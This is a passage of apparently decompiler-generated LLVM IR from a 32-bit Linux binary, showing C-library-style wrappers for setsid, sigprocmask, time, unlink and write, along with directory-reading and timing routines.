dec_label_pc_8052415:                             ; preds = %dec_label_pc_80523e8
  %v1_8052415 = call i32 @function_8052719(i32 %v0_8052401)
  %v0_805241a = load i32, i32* %esi.global-to-local, align 4
  %v1_805241a = sub i32 0, %v0_805241a
  %v2_805241c = inttoptr i32 %v1_8052415 to i32*
  store i32 %v1_805241a, i32* %v2_805241c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052424.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052421

dec_label_pc_8052421:                             ; preds = %dec_label_pc_80523e8, %dec_label_pc_8052415
  %v2_8052424 = phi i32 [ %v0_80523e9, %dec_label_pc_80523e8 ], [ %v2_8052424.pre, %dec_label_pc_8052415 ]
  %v0_8052421 = phi i32 [ %v1_8052409, %dec_label_pc_80523e8 ], [ -1, %dec_label_pc_8052415 ]
  store i32 %v2_8052424, i32* @esi, align 4
  ret i32 %v0_8052421

; uselistorder directives
  uselistorder i32 %v1_8052409, { 1, 0, 2 }
  uselistorder i32 %v0_8052401, { 1, 0 }
  uselistorder label %dec_label_pc_8052421, { 1, 0 }
}

define i32 @function_8052427() local_unnamed_addr {
dec_label_pc_8052427:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052427 = load i32, i32* @ebx, align 4
  store i32 %v0_8052427, i32* %stack_var_-4, align 4
  %v1_8052430 = call i32 @setsid(i32 %v0_8052427)
  store i32 %v1_8052430, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052430, -4095
  br i1 %tmp7, label %dec_label_pc_8052447, label %dec_label_pc_805243b

dec_label_pc_805243b:                             ; preds = %dec_label_pc_8052427
  %v1_805243b = call i32 @function_8052719(i32 %v0_8052427)
  %v0_8052440 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052440 = sub i32 0, %v0_8052440
  %v2_8052442 = inttoptr i32 %v1_805243b to i32*
  store i32 %v1_8052440, i32* %v2_8052442, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805244b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052447

dec_label_pc_8052447:                             ; preds = %dec_label_pc_8052427, %dec_label_pc_805243b
  %v2_805244b = phi i32 [ %v0_8052427, %dec_label_pc_8052427 ], [ %v2_805244b.pre, %dec_label_pc_805243b ]
  %v0_8052447 = phi i32 [ %v1_8052430, %dec_label_pc_8052427 ], [ -1, %dec_label_pc_805243b ]
  store i32 %v2_805244b, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052447

; uselistorder directives
  uselistorder i32 %v1_8052430, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052447, { 1, 0 }
}

define i32 @function_805244d(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805244d:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_805244e = load i32, i32* @esi, align 4
  %v4_8052452 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8052452, i32* @ecx, align 4
  %v2_805245e = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_805245e, label %dec_label_pc_8052477, label %dec_label_pc_8052462

dec_label_pc_8052462:                             ; preds = %dec_label_pc_805244d
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8052477, label %dec_label_pc_8052467

dec_label_pc_8052467:                             ; preds = %dec_label_pc_8052462
  %v1_8052467 = call i32 @function_8052719(i32 %v0_805244e)
  %v1_805246c = inttoptr i32 %v1_8052467 to i32*
  store i32 22, i32* %v1_805246c, align 4
  br label %dec_label_pc_805249e

dec_label_pc_8052477:                             ; preds = %dec_label_pc_8052462, %dec_label_pc_805244d
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805247c = load i32, i32* @ebx, align 4
  %v7_8052484 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805247c, i32* @ebx, align 4
  store i32 %v7_8052484, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8052484, -4095
  br i1 %tmp12, label %dec_label_pc_805249e, label %dec_label_pc_8052490

dec_label_pc_8052490:                             ; preds = %dec_label_pc_8052477
  %v1_8052490 = call i32 @function_8052719(i32 %v0_805247c)
  %v0_8052495 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052495 = sub i32 0, %v0_8052495
  %v2_8052497 = inttoptr i32 %v1_8052490 to i32*
  store i32 %v1_8052495, i32* %v2_8052497, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805249e

dec_label_pc_805249e:                             ; preds = %dec_label_pc_8052490, %dec_label_pc_8052477, %dec_label_pc_8052467
  %storemerge = phi i32 [ -1, %dec_label_pc_8052467 ], [ %v7_8052484, %dec_label_pc_8052477 ], [ -1, %dec_label_pc_8052490 ]
  %v2_805249e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805249e, i32* @edx, align 4
  store i32 %v0_805244e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8052484, { 1, 0, 2 }
  uselistorder i32 %v0_805247c, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_80524a2(i32* %arg1) local_unnamed_addr {
dec_label_pc_80524a2:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80524a2 = load i32, i32* @edi, align 4
  store i32 %v0_80524a2, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_80524aa = load i32, i32* @ebx, align 4
  %v2_80524b2 = call i32 @time(i32* %arg1)
  store i32 %v0_80524aa, i32* @ebx, align 4
  store i32 %v2_80524b2, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_80524b2, -4095
  br i1 %tmp10, label %dec_label_pc_80524ca, label %dec_label_pc_80524be

dec_label_pc_80524be:                             ; preds = %dec_label_pc_80524a2
  %v1_80524be = call i32 @function_8052719(i32 %v0_80524aa)
  %v0_80524c3 = load i32, i32* %edi.global-to-local, align 4
  %v1_80524c3 = sub i32 0, %v0_80524c3
  %v2_80524c5 = inttoptr i32 %v1_80524be to i32*
  store i32 %v1_80524c3, i32* %v2_80524c5, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80524ce.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80524ca

dec_label_pc_80524ca:                             ; preds = %dec_label_pc_80524a2, %dec_label_pc_80524be
  %v2_80524ce = phi i32 [ %v0_80524a2, %dec_label_pc_80524a2 ], [ %v2_80524ce.pre, %dec_label_pc_80524be ]
  %v0_80524ca = phi i32 [ %v2_80524b2, %dec_label_pc_80524a2 ], [ -1, %dec_label_pc_80524be ]
  %v2_80524cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80524cc, i32* @edx, align 4
  store i32 %v2_80524ce, i32* @edi, align 4
  ret i32 %v0_80524ca

; uselistorder directives
  uselistorder i32 %v2_80524b2, { 1, 0, 2 }
  uselistorder i32 %v0_80524aa, { 1, 0 }
  uselistorder label %dec_label_pc_80524ca, { 1, 0 }
}

define i32 @function_80524d0() local_unnamed_addr {
dec_label_pc_80524d0:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80524d0 = load i32, i32* @edi, align 4
  store i32 %v0_80524d0, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_80524d8 = load i32, i32* @ebx, align 4
  %v1_80524d9 = inttoptr i32 %tmp to i8*
  %v3_80524e0 = call i32 @unlink(i8* %v1_80524d9)
  store i32 %v0_80524d8, i32* @ebx, align 4
  store i32 %v3_80524e0, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80524e0, -4095
  br i1 %tmp9, label %dec_label_pc_80524f8, label %dec_label_pc_80524ec

dec_label_pc_80524ec:                             ; preds = %dec_label_pc_80524d0
  %v1_80524ec = call i32 @function_8052719(i32 %v0_80524d8)
  %v0_80524f1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80524f1 = sub i32 0, %v0_80524f1
  %v2_80524f3 = inttoptr i32 %v1_80524ec to i32*
  store i32 %v1_80524f1, i32* %v2_80524f3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80524fc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80524f8

dec_label_pc_80524f8:                             ; preds = %dec_label_pc_80524d0, %dec_label_pc_80524ec
  %v2_80524fc = phi i32 [ %v0_80524d0, %dec_label_pc_80524d0 ], [ %v2_80524fc.pre, %dec_label_pc_80524ec ]
  %v0_80524f8 = phi i32 [ %v3_80524e0, %dec_label_pc_80524d0 ], [ -1, %dec_label_pc_80524ec ]
  store i32 %v2_80524fc, i32* @edi, align 4
  ret i32 %v0_80524f8

; uselistorder directives
  uselistorder i32 %v3_80524e0, { 1, 0, 2 }
  uselistorder i32 %v0_80524d8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80524f8, { 1, 0 }
}

define i32 @function_80524fe(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80524fe:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80524fe = load i32, i32* @edi, align 4
  store i32 %v0_80524fe, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805250e = load i32, i32* @ebx, align 4
  %v4_8052516 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8052516, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052516, -4095
  br i1 %tmp12, label %dec_label_pc_805252e, label %dec_label_pc_8052522

dec_label_pc_8052522:                             ; preds = %dec_label_pc_80524fe
  %v1_8052522 = call i32 @function_8052719(i32 %v0_805250e)
  %v0_8052527 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052527 = sub i32 0, %v0_8052527
  %v2_8052529 = inttoptr i32 %v1_8052522 to i32*
  store i32 %v1_8052527, i32* %v2_8052529, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052532.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805252e

dec_label_pc_805252e:                             ; preds = %dec_label_pc_80524fe, %dec_label_pc_8052522
  %v2_8052532 = phi i32 [ %v0_80524fe, %dec_label_pc_80524fe ], [ %v2_8052532.pre, %dec_label_pc_8052522 ]
  %v0_805252e = phi i32 [ %v4_8052516, %dec_label_pc_80524fe ], [ -1, %dec_label_pc_8052522 ]
  store i32 %v2_8052532, i32* %edi.global-to-local, align 4
  ret i32 %v0_805252e

; uselistorder directives
  uselistorder i32 %v4_8052516, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805252e, { 1, 0 }
}

define i32 @function_8052534() local_unnamed_addr {
dec_label_pc_8052534:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_8052534 = load i32, i32* @edi, align 4
  %v0_8052535 = load i32, i32* @esi, align 4
  %v0_8052536 = load i32, i32* @ebx, align 4
  %v12_8052537 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_805253e = inttoptr i32 %tmp to i32*
  %v2_805253e = load i32, i32* %v1_805253e, align 4
  %v12_805253e = icmp eq i32 %v2_805253e, -1
  %v1_8052541 = icmp eq i1 %v12_805253e, false
  br i1 %v1_8052541, label %dec_label_pc_8052553, label %dec_label_pc_8052543

dec_label_pc_8052543:                             ; preds = %dec_label_pc_8052534
  %v1_8052543 = call i32 @function_8052719(i32 %v0_8052536)
  %v1_8052548 = inttoptr i32 %v1_8052543 to i32*
  store i32 9, i32* %v1_8052548, align 4
  br label %dec_label_pc_805259d

dec_label_pc_8052553:                             ; preds = %dec_label_pc_8052534
  %v1_8052553 = add i32 %tmp, 24
  store i32 %v12_8052537, i32* @esi, align 4
  %v2_8052562 = call i32 @function_80540a0(i32 %v12_8052537, i32 134561949)
  %v1_805256a = call i32 @function_805409d(i32 %v1_8052553)
  store i32 %v1_805256a, i32* @eax, align 4
  %v0_805256f = load i32, i32* @edi, align 4
  %v1_805256f = inttoptr i32 %v0_805256f to i32*
  %v2_805256f = load i32, i32* %v1_805256f, align 4
  store i32 %v2_805256f, i32* @ebx, align 4
  store i32 -1, i32* %v1_805256f, align 4
  %v2_805257c = call i32 @function_80540a0(i32 %v12_8052537, i32 1)
  %v0_8052582 = load i32, i32* @edi, align 4
  %v1_8052582 = add i32 %v0_8052582, 12
  %v2_8052582 = inttoptr i32 %v1_8052582 to i32*
  %v3_8052582 = load i32, i32* %v2_8052582, align 4
  %v1_8052585 = call i32 @function_8053939(i32 %v3_8052582)
  %v0_805258a = load i32, i32* @edi, align 4
  %v1_805258d = call i32 @function_8053939(i32 %v0_805258a)
  %v0_8052592 = load i32, i32* @ebx, align 4
  %v1_8052595 = call i32 @function_80521e1(i32 %v0_8052592)
  br label %dec_label_pc_805259d

dec_label_pc_805259d:                             ; preds = %dec_label_pc_8052543, %dec_label_pc_8052553
  %v0_80525a3 = phi i32 [ -1, %dec_label_pc_8052543 ], [ %v1_8052595, %dec_label_pc_8052553 ]
  store i32 %v0_8052536, i32* @ebx, align 4
  store i32 %v0_8052535, i32* @esi, align 4
  store i32 %v0_8052534, i32* @edi, align 4
  ret i32 %v0_80525a3

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805259d, { 1, 0 }
}

define i32 @function_80525a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80525a4:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80525a4 = load i32, i32* @edi, align 4
  %v0_80525a6 = load i32, i32* @ebx, align 4
  store i32 %v0_80525a6, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_80525b5 = inttoptr i32 %arg1 to i8*
  %v3_80525b5 = call i32 @function_80522f2(i8* %v2_80525b5, i32 67584)
  store i32 %v3_80525b5, i32* %eax.global-to-local, align 4
  store i32 %v3_80525b5, i32* @edi, align 4
  %v2_80525bf = icmp slt i32 %v3_80525b5, 0
  br i1 %v2_80525bf, label %dec_label_pc_805268c, label %dec_label_pc_80525c7

dec_label_pc_80525c7:                             ; preds = %dec_label_pc_80525a4
  %v0_80525c7 = load i32, i32* @ebx, align 4
  %v2_80525c9 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_80525c9, i32* %eax.global-to-local, align 4
  store i32 %v3_80525b5, i32* %stack_var_-124, align 4
  %v4_80525cf = call i32 @function_805449a(i32 %v3_80525b5, i32 %v2_80525c9, i32 %v0_80525c7, i32 %v0_80525c7)
  store i32 %v4_80525cf, i32* %eax.global-to-local, align 4
  %v2_80525d7 = icmp slt i32 %v4_80525cf, 0
  br i1 %v2_80525d7, label %dec_label_pc_80525ed, label %dec_label_pc_80525db

dec_label_pc_80525db:                             ; preds = %dec_label_pc_80525c7
  %v0_80525e0 = load i32, i32* @edi, align 4
  store i32 %v0_80525e0, i32* %stack_var_-124, align 4
  %v3_80525e1 = call i32 @function_805211d(i32 %v0_80525e0, i32 2, i32 1)
  store i32 %v3_80525e1, i32* %eax.global-to-local, align 4
  %v2_80525e9 = icmp slt i32 %v3_80525e1, 0
  %v1_80525eb = icmp eq i1 %v2_80525e9, false
  br i1 %v1_80525eb, label %dec_label_pc_8052603, label %dec_label_pc_80525ed

dec_label_pc_80525ed:                             ; preds = %dec_label_pc_80525db, %dec_label_pc_80525c7
  %v0_80525ed = load i32, i32* %stack_var_-124, align 4
  %v1_80525ed = call i32 @function_8052719(i32 %v0_80525ed)
  store i32 %v1_80525ed, i32* %eax.global-to-local, align 4
  store i32 %v1_80525ed, i32* @ebx, align 4
  %v1_80525f7 = inttoptr i32 %v1_80525ed to i32*
  %v2_80525f7 = load i32, i32* %v1_80525f7, align 4
  %v0_80525f9 = load i32, i32* @edi, align 4
  store i32 %v0_80525f9, i32* %stack_var_-124, align 4
  %v1_80525fa = call i32 @function_80521e1(i32 %v0_80525f9)
  store i32 %v1_80525fa, i32* %eax.global-to-local, align 4
  %v1_80525ff = load i32, i32* @ebx, align 4
  %v2_80525ff = inttoptr i32 %v1_80525ff to i32*
  store i32 %v2_80525f7, i32* %v2_80525ff, align 4
  br label %dec_label_pc_8052678

dec_label_pc_8052603:                             ; preds = %dec_label_pc_80525db
  store i32 48, i32* %stack_var_-124, align 4
  %v1_8052608 = call i32 @function_8052b74(i32 48)
  store i32 %v1_8052608, i32* %eax.global-to-local, align 4
  store i32 %v1_8052608, i32* @ebx, align 4
  %v1_8052612 = icmp eq i32 %v1_8052608, 0
  br i1 %v1_8052612, label %dec_label_pc_8052664, label %dec_label_pc_8052616

dec_label_pc_8052616:                             ; preds = %dec_label_pc_8052603
  %v0_8052616 = load i32, i32* @edi, align 4
  %v2_8052616 = inttoptr i32 %v1_8052608 to i32*
  store i32 %v0_8052616, i32* %v2_8052616, align 4
  %v1_8052618 = add i32 %v1_8052608, 16
  %v2_8052618 = inttoptr i32 %v1_8052618 to i32*
  store i32 0, i32* %v2_8052618, align 4
  %v1_805261f = add i32 %v1_8052608, 8
  %v2_805261f = inttoptr i32 %v1_805261f to i32*
  store i32 0, i32* %v2_805261f, align 4
  %v1_8052626 = add i32 %v1_8052608, 4
  %v2_8052626 = inttoptr i32 %v1_8052626 to i32*
  store i32 0, i32* %v2_8052626, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8052631 = load i32, i32* @ebx, align 4
  %v2_8052631 = add i32 %v1_8052631, 20
  %v3_8052631 = inttoptr i32 %v2_8052631 to i32*
  store i32 %tmp, i32* %v3_8052631, align 4
  %v0_8052634 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052639 = icmp ugt i32 %v0_8052634, 511
  br i1 %v6_8052639, label %dec_label_pc_8052642, label %dec_label_pc_805263b

dec_label_pc_805263b:                             ; preds = %dec_label_pc_8052616
  %v0_805263b = load i32, i32* @ebx, align 4
  %v1_805263b = add i32 %v0_805263b, 20
  %v2_805263b = inttoptr i32 %v1_805263b to i32*
  store i32 512, i32* %v2_805263b, align 4
  br label %dec_label_pc_8052642

dec_label_pc_8052642:                             ; preds = %dec_label_pc_8052616, %dec_label_pc_805263b
  %v0_8052644 = load i32, i32* @ebx, align 4
  %v1_8052644 = add i32 %v0_8052644, 20
  %v2_8052644 = inttoptr i32 %v1_8052644 to i32*
  %v3_8052644 = load i32, i32* %v2_8052644, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_8052649 = call i32 @function_80532e8(i64 1, i32 %v3_8052644)
  store i32 %v3_8052649, i32* %eax.global-to-local, align 4
  %v1_8052651 = load i32, i32* @ebx, align 4
  %v2_8052651 = add i32 %v1_8052651, 12
  %v3_8052651 = inttoptr i32 %v2_8052651 to i32*
  store i32 %v3_8052649, i32* %v3_8052651, align 4
  %v1_8052654 = icmp eq i32 %v3_8052649, 0
  %v1_8052656 = icmp eq i1 %v1_8052654, false
  br i1 %v1_8052656, label %dec_label_pc_805267c, label %dec_label_pc_8052658

dec_label_pc_8052658:                             ; preds = %dec_label_pc_8052642
  %v0_805265b = load i32, i32* @ebx, align 4
  store i32 %v0_805265b, i32* %stack_var_-124, align 4
  %v1_805265c = call i32 @function_8053939(i32 %v0_805265b)
  store i32 %v1_805265c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052664

dec_label_pc_8052664:                             ; preds = %dec_label_pc_8052603, %dec_label_pc_8052658
  %v0_8052667 = load i32, i32* @edi, align 4
  store i32 %v0_8052667, i32* %stack_var_-124, align 4
  %v1_8052668 = call i32 @function_80521e1(i32 %v0_8052667)
  store i32 %v1_8052668, i32* %eax.global-to-local, align 4
  %v1_805266d = call i32 @function_8052719(i32 %v0_8052667)
  store i32 %v1_805266d, i32* %eax.global-to-local, align 4
  %v1_8052672 = inttoptr i32 %v1_805266d to i32*
  store i32 12, i32* %v1_8052672, align 4
  br label %dec_label_pc_8052678

dec_label_pc_8052678:                             ; preds = %dec_label_pc_80525ed, %dec_label_pc_8052664
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052689

dec_label_pc_805267c:                             ; preds = %dec_label_pc_8052642
  %v0_805267e = load i32, i32* @ebx, align 4
  %v1_805267e = add i32 %v0_805267e, 24
  store i32 %v1_805267e, i32* %eax.global-to-local, align 4
  store i32 %v1_805267e, i32* %stack_var_-124, align 4
  %v1_8052684 = call i32 @function_805409d(i32 %v1_805267e)
  store i32 %v1_8052684, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052689

dec_label_pc_8052689:                             ; preds = %dec_label_pc_8052678, %dec_label_pc_805267c
  %v2_8052691.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805268c

dec_label_pc_805268c:                             ; preds = %dec_label_pc_80525a4, %dec_label_pc_8052689
  %v2_8052691 = phi i32 [ %v0_80525a6, %dec_label_pc_80525a4 ], [ %v2_8052691.pre, %dec_label_pc_8052689 ]
  %v0_805268f = load i32, i32* @ebx, align 4
  store i32 %v0_805268f, i32* %eax.global-to-local, align 4
  store i32 %v2_8052691, i32* @ebx, align 4
  store i32 %v0_80525a4, i32* @edi, align 4
  ret i32 %v0_805268f

; uselistorder directives
  uselistorder i32 %v3_8052649, { 1, 0, 2 }
  uselistorder i32 %v1_8052608, { 0, 1, 5, 4, 3, 2, 6 }
  uselistorder i32 %v1_80525ed, { 1, 0, 2 }
  uselistorder i32 %v3_80525b5, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_80532e8, { 1, 0, 2 }
  uselistorder i32 512, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_80521e1, { 12, 11, 10, 22, 21, 18, 17, 20, 16, 19, 15, 14, 13, 3, 5, 9, 8, 7, 6, 4, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805268c, { 1, 0 }
  uselistorder label %dec_label_pc_8052689, { 1, 0 }
  uselistorder label %dec_label_pc_8052678, { 1, 0 }
  uselistorder label %dec_label_pc_8052664, { 1, 0 }
  uselistorder label %dec_label_pc_8052642, { 1, 0 }
}

define i32 @function_8052695() local_unnamed_addr {
dec_label_pc_8052695:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052695 = load i32, i32* @esi, align 4
  %v0_8052696 = load i32, i32* @ebx, align 4
  store i32 %v0_8052696, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_805269e = add i32 %tmp, 24
  store i32 %v1_805269e, i32* @ebx, align 4
  %v2_80526a7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80526a7, i32* @eax, align 4
  %v2_80526ac = call i32 @function_80540a0(i32 %v2_80526a7, i32 134561949)
  %v0_80526b1 = load i32, i32* @ebx, align 4
  %v1_80526b4 = call i32 @function_805409d(i32 %v0_80526b1)
  br label %dec_label_pc_80526bc

dec_label_pc_80526bc:                             ; preds = %dec_label_pc_80526e7, %dec_label_pc_8052695
  %v0_80526bc = load i32, i32* @esi, align 4
  %v1_80526bc = add i32 %v0_80526bc, 8
  %v2_80526bc = inttoptr i32 %v1_80526bc to i32*
  %v3_80526bc = load i32, i32* %v2_80526bc, align 4
  %v2_80526bf = add i32 %v0_80526bc, 4
  %v3_80526bf = inttoptr i32 %v2_80526bf to i32*
  %v4_80526bf = load i32, i32* %v3_80526bf, align 4
  %v6_80526c2 = icmp ugt i32 %v3_80526bc, %v4_80526bf
  br i1 %v6_80526c2, label %dec_label_pc_80526e7, label %dec_label_pc_80526c4

dec_label_pc_80526c4:                             ; preds = %dec_label_pc_80526bc
  %v0_80526c4 = load i32, i32* @edx, align 4
  %v1_80526c5 = add i32 %v0_80526bc, 20
  %v2_80526c5 = inttoptr i32 %v1_80526c5 to i32*
  %v3_80526c5 = load i32, i32* %v2_80526c5, align 4
  %v1_80526c8 = add i32 %v0_80526bc, 12
  %v2_80526c8 = inttoptr i32 %v1_80526c8 to i32*
  %v3_80526c8 = load i32, i32* %v2_80526c8, align 4
  %v1_80526cb = inttoptr i32 %v0_80526bc to i32*
  %v2_80526cb = load i32, i32* %v1_80526cb, align 4
  %v4_80526cd = call i32 @function_80544e2(i32 %v2_80526cb, i32 %v3_80526c8, i32 %v3_80526c5, i32 %v0_80526c4)
  %tmp12 = icmp slt i32 %v4_80526cd, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_80526dd, label %dec_label_pc_80526d9

dec_label_pc_80526d9:                             ; preds = %dec_label_pc_80526c4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052703

dec_label_pc_80526dd:                             ; preds = %dec_label_pc_80526c4
  %v1_80526dd = load i32, i32* @esi, align 4
  %v2_80526dd = add i32 %v1_80526dd, 8
  %v3_80526dd = inttoptr i32 %v2_80526dd to i32*
  store i32 %v4_80526cd, i32* %v3_80526dd, align 4
  %v0_80526e0 = load i32, i32* @esi, align 4
  %v1_80526e0 = add i32 %v0_80526e0, 4
  %v2_80526e0 = inttoptr i32 %v1_80526e0 to i32*
  store i32 0, i32* %v2_80526e0, align 4
  %v0_80526e7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80526e7

dec_label_pc_80526e7:                             ; preds = %dec_label_pc_80526bc, %dec_label_pc_80526dd
  %v1_80526f5 = phi i32 [ %v0_80526bc, %dec_label_pc_80526bc ], [ %v0_80526e7.pre, %dec_label_pc_80526dd ]
  %v1_80526e7 = add i32 %v1_80526f5, 4
  %v2_80526e7 = inttoptr i32 %v1_80526e7 to i32*
  %v3_80526e7 = load i32, i32* %v2_80526e7, align 4
  %v2_80526ec = add i32 %v1_80526f5, 12
  %v3_80526ec = inttoptr i32 %v2_80526ec to i32*
  %v4_80526ec = load i32, i32* %v3_80526ec, align 4
  %v5_80526ec = add i32 %v4_80526ec, %v3_80526e7
  store i32 %v5_80526ec, i32* @ebx, align 4
  %v1_80526ef = add i32 %v5_80526ec, 8
  %v2_80526ef = inttoptr i32 %v1_80526ef to i16*
  %v3_80526ef = load i16, i16* %v2_80526ef, align 2
  %v4_80526ef = zext i16 %v3_80526ef to i32
  store i32 %v4_80526ef, i32* @edx, align 4
  %v2_80526f3 = add i32 %v4_80526ef, %v3_80526e7
  store i32 %v2_80526f3, i32* %v2_80526e7, align 4
  %v0_80526f8 = load i32, i32* @ebx, align 4
  %v1_80526f8 = add i32 %v0_80526f8, 4
  %v2_80526f8 = inttoptr i32 %v1_80526f8 to i32*
  %v3_80526f8 = load i32, i32* %v2_80526f8, align 4
  %v1_80526fb = load i32, i32* @esi, align 4
  %v2_80526fb = add i32 %v1_80526fb, 16
  %v3_80526fb = inttoptr i32 %v2_80526fb to i32*
  store i32 %v3_80526f8, i32* %v3_80526fb, align 4
  %v0_80526fe = load i32, i32* @ebx, align 4
  %v1_80526fe = inttoptr i32 %v0_80526fe to i32*
  %v2_80526fe = load i32, i32* %v1_80526fe, align 4
  %v3_80526fe = icmp eq i32 %v2_80526fe, 0
  br i1 %v3_80526fe, label %dec_label_pc_80526bc, label %dec_label_pc_8052703.loopexit

dec_label_pc_8052703.loopexit:                    ; preds = %dec_label_pc_80526e7
  br label %dec_label_pc_8052703

dec_label_pc_8052703:                             ; preds = %dec_label_pc_8052703.loopexit, %dec_label_pc_80526d9
  store i32 %v2_80526a7, i32* @eax, align 4
  %v2_805270c = call i32 @function_80540a0(i32 %v2_80526a7, i32 1)
  %v0_8052711 = load i32, i32* @ebx, align 4
  %v2_8052716 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052716, i32* @ebx, align 4
  store i32 %v0_8052695, i32* @esi, align 4
  ret i32 %v0_8052711

; uselistorder directives
  uselistorder i32 %v1_80526f5, { 1, 0 }
  uselistorder i32 %v0_80526bc, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80526e7, { 1, 0 }
}

define i32 @function_8052719(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052719:
  ret i32 ptrtoint (i32* @global_var_8056934.204 to i32)
}

define i32 @function_805271f() local_unnamed_addr {
dec_label_pc_805271f:
  %tmp = call i64 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %v1_8052727 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8052727 = call i32 @function_80548b7(%tms* %v1_8052727)
  %v4_805272c = trunc i64 %tmp to i32
  %v4_8052730 = load i32, i32* %stack_var_-16, align 4
  %v5_8052730 = add i32 %v4_8052730, %v4_805272c
  %v3_8052737 = mul i32 %v5_8052730, 10000
  %v1_805273d = and i32 %v3_8052737, 2147483632
  ret i32 %v1_805273d

